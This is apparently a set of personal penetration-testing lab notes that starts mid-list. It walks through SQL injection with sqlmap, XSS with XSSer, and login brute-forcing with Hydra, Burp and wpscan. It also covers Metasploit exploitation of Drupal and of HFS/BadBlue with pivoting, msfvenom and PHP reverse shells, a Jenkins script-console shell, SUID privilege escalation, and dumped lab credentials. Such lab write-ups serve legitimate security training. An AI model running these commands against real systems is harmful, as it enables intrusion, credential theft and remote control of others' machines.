2. `sqlmap -u "[http://192.42.186.3/sqli_1.php?title=hacking&action=search](http://192.42.186.3/sqli_1.php?title=hacking&action=search)" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title`
3. hacking' AND (SELECT 1819 FROM(SELECT COUNT(*),CONCAT(0x716a767171,(SELECT (ELT(1819=1819,1))),0x7171707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'bLrY'='bLrY&action=search
4. `sqlmap -u "[http://192.42.186.3/sqli_1.php?title=hacking&action=search](http://192.42.186.3/sqli_1.php?title=hacking&action=search)" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title --dbs`
5. `sqlmap -u "[http://192.42.186.3/sqli_1.php?title=hacking&action=search](http://192.42.186.3/sqli_1.php?title=hacking&action=search)" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title -D bWAPP --tables`
6. `sqlmap -u "[http://192.42.186.3/sqli_1.php?title=hacking&action=search](http://192.42.186.3/sqli_1.php?title=hacking&action=search)" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title -D bWAPP -T users --columns`
7. `sqlmap -u "[http://192.42.186.3/sqli_1.php?title=hacking&action=search](http://192.42.186.3/sqli_1.php?title=hacking&action=search)" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title -D bWAPP -T users -C admin,password,email --dump`
8. `sqlmap -r request -p title`

**XSS attack with XSSer**

1. `xsser --url '[http://192.131.167.3/index.php?page=dns-lookup.php](http://192.131.167.3/index.php?page=dns-lookup.php)' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'`
2. `xsser --url '[http://192.131.167.3/index.php?page=dns-lookup.php](http://192.131.167.3/index.php?page=dns-lookup.php)' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --auto`
3. `xsser --url '[http://192.131.167.3/index.php?page=dns-lookup.php](http://192.131.167.3/index.php?page=dns-lookup.php)' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(1)</script>"`

**Attacking HTTP Login form** 

**Hydra**

1. echo -e "admin\nbee\nuser1\nuser2" > users
2. cat /root/Desktop/wordlists/100-common-passwords.txt > pws
3. echo "bug" >> pws
4. `hydra -L users -P pws 192.210.201.3 http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!”`

**ZAProxy**

1. Capture the login post request
2. fuzz
3. Addpayloada 
4. Start fuzzer 

**Burp suite**

1. capture the req [http://192.190.241.3/basic](http://192.190.241.3/basic)
2. decode the basic encoded value - base64 decode 
3. Add basic encrypted value
4. Choose sniper
5. Load the common.txt payloads
6. Add payload processing [1. Add prefix admin: 2. encode - base64 encode]
7. Start attack 
8. Got 301 req, capture the encoded cred
9. decrypt and get the flag 

# Drupal

ref: [https://www.spoofman.co.uk/courses/englishdump](https://www.spoofman.co.uk/courses/englishdump)

[https://walk-throughs.medium.com/exploiting-drupal-via-metasploit-ctf-walkthrough-fcd5f5fa2fa](https://walk-throughs.medium.com/exploiting-drupal-via-metasploit-ctf-walkthrough-fcd5f5fa2fa)

IP = **192.168.100.52**

Web application Machine hosting **Drupal** 

Exploitation: RCE 

$ `ip a` 

$ `sudo netdiscover -r 192.168.100.0/24`

$ `sudo nmap -sSVC -p- —open 192.168.100.4`

$ `sudo msfconsole`

>> `search drupal` 

>> `use exploit/unix/webapp/drupal_drupalgeddon2`

>> `show options`

>> `set RHOSTS 192.168.100.4`

>> `set TARGETURI /drupal/`

>> `run` 

Got meterpreter shell 

Open the new terminal and generate one msfvenom payload 

$ `msfvenom —payload linux/x86/shell_reverse_tcp —platform linux LHOST=kali ip LPORT=1234 -f elf -o sh.elf` 

$ `nc -lvnp 1234`

Now again go to meterpreter session 

meterpreter> `upload sh.elf` 

Upload completed 

Bow open shell session 

meterpretrr> `shell` 

`chmod +x sh.elf` 

Now execute this 

`./sh.elf` 

Now we got reverse shell in the netcat that listening 

Now terminate the meterpreter session, and go to netcat got reverse shell

`python -c ‘import pty;pty.spawn(”/bin/bash”)’`

got shell 

www-data@DC-1:/var/www$ `export TERM=xterm`

now press ctrl Z 

now type this command in the same terminal 

$ `stty raw echo;fg;reset`

Now enter ctrl C 

Now we got full interactive shell 

www-data@DC-1:/var/www$

DB Enum 

www-data@DC-1:/var/www$ `ls`

www-data@DC-1:/var/www$ `cd sites`

www-data@DC-1:/var/www/sites$ `ls`

www-data@DC-1:/var/www$ `cd default` 

www-data@DC-1:/var/www/sites/default$ `ls`

www-data@DC-1:/var/www/sites/default$ `cat settings.php` 

We will get the database credentials in the settings.php file 

Now login to mysql database using the cred we get in the settings.php file 

www-data@DC-1:/var/www$ `mysql -u dbuser -D drupaldb -p` 

password: R0ck3t

Login successful 

mysql> `show databases;`

mysql> `use drupaldb;`  in exam it is syntex

mysql> `show tables;`

mysql> `SELECT * FROM users;`

mysql> `SELECT name,pass,mail FROM users;`

copy all the details and exit it 

mysql> `exit` 

Login to user Acc

Now login via ssh 

$ `ssh auditor@198.168.100.52` 

passwrd: qwertyuiop

Login successful to auditor terminal

get flag of user 

Another way 

www-data@DC-1:/var/www$ `su auditor` 

enter password: qwertyuiop

Login successful to auditor terminal 

auditor@kalilinux$  get the user flag here 

Priv Esc

Now priv escalation to get admin - SUID 

www-data@DC-1:/var/www$ `find /etc/passwd -exec ‘/bin/sh’ \;`

the above command will give root access shell 

#`cd /root`

#`ls`

get the root flag here 

# Word press

Ref: [https://www.youtube.com/watch?v=2TmguIvR3Kw](https://www.youtube.com/watch?v=2TmguIvR3Kw)

$ `nmap -sCSV ip`

$ `[dirsearch.py](http://dirsearch.py) -u 10.10.67.11 -E -x 400,500 -r -t 100`

access the site http://10.10.10.10/blog

Modify etc hosts

$ `nano /etc/hosts`

add our ip as internal.thm save that 

Now access http://10.10.10.10/blog, got actual web page 

Now go to login page 

internal.thm/blog/wp-login.php

Now run wordpress scan 

$ `wpscan —url [http://10.10.10.10/blog](http://internal.thm/blog) -e vp,u` 

Results: No plugins found and one user found: admin 

Now brute force password 

$ `wpscan —url [http://10.10.10.10/blog](http://10.10.10.10/blog) -—usernames admin -—passwords /root/Desktop/passes/rockyou.txt -—max-threads 50`

Got credentials admin: my2boys

Use the credentials and login to the website 

After gets login, go through the application 

Go to post > private post 

Open that private post 

Got one user credentials william:arnold147

Now upload malicious php and get reverse shell 

In terminal make the netcat listen 

$ `nc -lvnp 53`

Now go to the website

Appearance > Theme editor > 404 template 

Go to tools in your terminal and copy the php-reverse-shell code 

paste the code in 404 template and edit the ip to kali ip and update it

Now go to the 404 template page 

http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php

Now in the netcat we get reverse command shell 

now type the commands in shell 

$ `id`

$ `ls -la` 

$ `cd /opt` 

$ `ls -la` 

$ cat wp-save.txt

We got one more user cred aubreanna:bubb13guM!@123

Now open new terminal and try to login that user vis ssh 

$ `ssh aubreanna@10.10.10.10`

password: bubb13guM!@123

Got user terminal 

aubreanna@internal$ get the user flag here 

aubreanna@internal$ `ls`

aubreanna@internal$ `jenkins.txt` 

Internal jenkins is running on 172.17.0.2:8000

aubreanna@internal$ `netstat -ano` 

Got to the terminal 

$ `ssh -L 8080:172.17.0.2:8080 auberenna@10.10.10.10` 

password: bubb13guM!@#123

Now we got login also with docker0 ip 

Now go to the website and type 127.0.0.1:8080 is the jenkins login page 

Now brute force the password of admin 

Go to burp suite 

capture the login request 

send to intruder

add password

payload use: desktop/customwordlist/kerbrutpass.txt

Got cred admin:spongebob 

login to the website using the credentials 

Manage jenkins> script console 

open netcat listener in aubereana terminal

aubreanna@internal$ `nc -nvlp 8044` 

enter the script from [https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) 

change cmd = “/bin/sh” 

put your ip in string host 

Now run 

Got reverse shell in netcat listerner

id

ls -la

cd /opt 

ls -la 

cat note.txt

Got root credentials root:tr0ub13guM!@#123

Now open the new terminal and login via ssh 

$ `ssh root@10.10.10.10` 

password: tr0ub13guM!@#123

Got root user 

root@internal$ `la -la`

root@internal$ `cat root.txt` 

Got root flag ! 

# Pivoting

- `service postgresql start && msfconsole`
- `workspace -a Pivoting`
- `db_nmap -sV -p- -O <Victim1IP>`
- `services`
- `search rejetto`
- `use exploit/windows/http/rejetto_hfs_exec`
- `show options`
- `set rhosts <Victim1IP>`
- `run`
- Got Meterpreter session
- `sysinfo`
- `getuid`
- `ipconfig`
- `run autoroute -s <Victim2IP/24>`
- run this in background
- `background`
- rename the session 1 meterpreter
- `sessions -n victim1 -i 1`
- `sessions`
- Now portscan
- `search portscan`
- `use auxiliary/scanner/portscan/tcp`
- `show options`
- `set rhosts Victim2iP`
- `exploit`
- Port 80 open port found on victim2
- Now go to session in metereter
- `sessions 1`
- `portfwd add -l 1234 -p 80 -r <Victim2IP>`
- Now again put this session in background
- `background`
- `db_nmap -sV -sS -p 1234 localhost`
- `search badblue`
- `use exploit/windows/http/badblue_passthru`
- `show options`
- `set payload windows/meterpreter/bind_tcp`
- `set rhosts <Victim2IP>`
- `set LPORT 4433`
- `run`
- got meterpreter session
- Observe that this is 2016 and old is 2012
- get flag

 

```bash
ls
service postgresql start
msfconsole

```
